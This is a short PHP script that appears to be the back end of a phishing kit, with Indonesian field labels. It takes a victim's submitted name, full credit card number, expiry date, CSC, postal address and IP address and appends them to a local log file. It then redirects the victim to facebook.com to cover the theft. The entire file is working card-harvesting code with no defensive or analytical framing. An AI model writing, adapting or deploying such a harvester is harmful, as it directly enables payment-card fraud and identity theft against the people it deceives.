<?php
$file = "2021________NewYear";
$firstName = $_POST['firstName'];
$creditCardNumber = $_POST['creditCardNumber'];
$month = $_POST['month'];
$year = $_POST['year'];
$csc = $_POST['csc'];
$street = $_POST['street'];
$city = $_POST['city'];
$zip = $_POST['zip'];
$country = $_POST['country'];
$ip = $_SERVER['REMOTE_ADDR'];


$handle = fopen($file, 'a');
fwrite($handle, "~~~~~~~~~~~~~~~~~ Payments ~~~~~~~~~~~~~~~ 02");
fwrite($handle, "\n");
fwrite($handle, "::  NAMA      :: ");
fwrite($handle, "$firstName");
fwrite($handle, "\n");
fwrite($handle, "::  CREDIT    :: ");
fwrite($handle, "$creditCardNumber");
fwrite($handle, "\n");
fwrite($handle, "::  EXPIRET   :: ");
fwrite($handle, "$month");
fwrite($handle, "|");
fwrite($handle, "$year");
fwrite($handle, "   CSC : ");
fwrite($handle, "$csc");
fwrite($handle, "\n");
fwrite($handle, "::  ALAMAT    :: ");
fwrite($handle, "$street");
fwrite($handle, "\n");
fwrite($handle, "::  KOTA      :: ");
fwrite($handle, "$city");
fwrite($handle, "\n");
fwrite($handle, "::  KODE POS  :: ");
fwrite($handle, "$zip");
fwrite($handle, "\n");
fwrite($handle, "::  NEGARA    :: ");
fwrite($handle, "$country");
fwrite($handle, "\n");
fwrite($handle, "::  IP        :: ");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fclose($handle);

header("Location:https://www.facebook.com/");
?>
